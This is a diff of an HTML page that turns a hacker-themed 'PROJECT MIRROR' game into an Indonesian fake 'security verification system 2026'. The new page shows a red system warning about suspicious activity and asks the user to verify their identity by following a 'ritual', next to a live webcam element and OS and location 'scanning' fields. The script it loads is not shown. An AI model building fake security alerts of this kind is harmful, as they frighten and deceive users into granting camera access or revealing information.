@@ -1,34 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACK- | PROJECT MIRROR</title>
+    <title>SISTEM VERIFIKASI KEAMANAN 2026</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <video id="webcam" autoplay playsinline></video>
-    <div class="glitch-overlay"></div>
     <div class="vignette"></div>
 
-    <div id="landing-page">
-        <div class="glitch-text" data-text="INITIALIZE">INITIALIZE</div>
-        <button id="start-btn">CONNECT TO MAIN FRAME</button>
-    </div>
-
-    <div id="game-container">
-        <div id="top-bar">
-            <span id="os-info">SCANNING...</span>
-            <span id="loc-info">LOCATING...</span>
-        </div>
-        
-        <div class="terminal-core">
-            <div id="display-text"></div>
-            <input type="text" id="typer" spellcheck="false" autocomplete="off" autofocus>
-            <div id="progress-bar"></div>
+    <div id="setup-screen">
+        <div class="modal">
+            <h2 style="color: #ff0000;">PERINGATAN SISTEM</h2>
+            <p>Aktivitas mencurigakan terdeteksi. Silakan verifikasi identitas Anda dengan mengikuti ritual sinkronisasi di bawah ini.</p>
+            <button id="init-btn">MULAI VERIFIKASI</button>
         </div>
     </div>
 
+    <div id="main-terminal" style="display: none;">
+        <div class="header">
+            <span id="os-tag">SCANNING...</span>
+            <span id="loc-tag">LOCATING...</span>
+        </div>
+        <div class="content">
+            <h1 id="command-prompt">MEMPERSIAPKAN...</h1>
+            <input type="text" id="typer" placeholder="KETIK DISINI..." autocomplete="off" autofocus>
+            <div class="progress-container"><div id="bar"></div></div>
+        </div>
+    </div>
     <script src="script.js"></script>
 </body>
 </html>
